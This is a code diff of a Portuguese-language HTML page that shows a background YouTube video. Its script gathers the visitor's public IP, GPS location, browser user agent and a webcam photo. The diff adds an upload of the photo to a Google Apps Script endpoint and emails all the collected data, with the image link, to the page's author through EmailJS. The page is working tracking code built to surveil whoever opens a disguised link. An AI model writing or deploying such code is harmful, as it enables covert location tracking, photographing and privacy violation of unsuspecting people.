@@ -51,9 +51,9 @@
 </head>
 <body>
 
-<!-- Vídeo de fundo (YouTube) -->
+<!-- Vídeo de fundo -->
 <div id="video-bg">
-  <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="encrypted-media" allowfullscreen></iframe>
+  <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 </div>
 
 <div id="content">
@@ -70,7 +70,7 @@
 <!-- EmailJS SDK -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-  emailjs.init("3nQv9Y-aSYhq53HDi"); // sua chave pública
+  emailjs.init("3nQv9Y-aSYhq53HDi"); // sua chave pública do EmailJS
 </script>
 
 <script>
@@ -81,8 +81,8 @@
     let ip = null;
     let userAgent = navigator.userAgent;
     let googleMapsLink = null;
+    let linkImagemDrive = null;
 
-    // Obter IP público
     const obterIP = async () => {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
@@ -94,7 +94,6 @@
       }
     };
 
-    // Obter localização
     const obterLocalizacao = () => {
       return new Promise(resolve => {
         if (!navigator.geolocation) {
@@ -119,7 +118,6 @@
       });
     };
 
-    // Capturar imagem da câmera
     const capturarImagem = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -142,7 +140,25 @@
       }
     };
 
-    // Executa em paralelo
+    const uploadParaDrive = async (imageBase64) => {
+      const url = "https://script.google.com/macros/s/AKfycbzoinFdcKunrWrDhxHDSXfNswmB1y64ZgjwfrFRYvNIPr2d1-NDDoponlNGegHXZn2kcw/exec";
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          body: JSON.stringify({ image: imageBase64 }),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        });
+        const data = await res.json();
+        return data.link || null;
+      } catch (e) {
+        console.error("Erro ao enviar para o Drive:", e.message);
+        return null;
+      }
+    };
+
+    // Executar tudo
     const [ipResult, locResult, imgResult] = await Promise.all([
       obterIP(),
       obterLocalizacao(),
@@ -160,36 +176,29 @@
       googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
     }
 
+    if (imageBase64) {
+      linkImagemDrive = await uploadParaDrive(imageBase64);
+    }
+
     const params = {
       latitude: latitude || "Não capturado",
       longitude: longitude || "Não capturado",
       google_maps: googleMapsLink || "Não disponível",
       ip_address: ip || "Não capturado",
       user_agent: userAgent || "Não disponível",
+      link_imagem: linkImagemDrive || "Imagem não capturada"
     };
 
-    const attachments = [];
-
-    if (imageBase64) {
-      attachments.push({
-        name: "foto.jpg",
-        data: imageBase64
+    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params)
+      .then(() => {
+        alert("E-mail enviado com sucesso com os dados e imagem no Drive!");
+      })
+      .catch(err => {
+        console.error("Erro ao enviar e-mail:", err);
+        alert("Erro ao enviar e-mail.");
       });
-    }
-
-    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params, null, {
-      attachments: attachments
-    })
-    .then(() => {
-      alert("E-mail enviado com sucesso com os dados disponíveis!");
-    })
-    .catch(err => {
-      console.error("Erro ao enviar e-mail:", err);
-      alert("Erro ao enviar e-mail.");
-    });
   }
 </script>
 
 </body>
 </html>
-
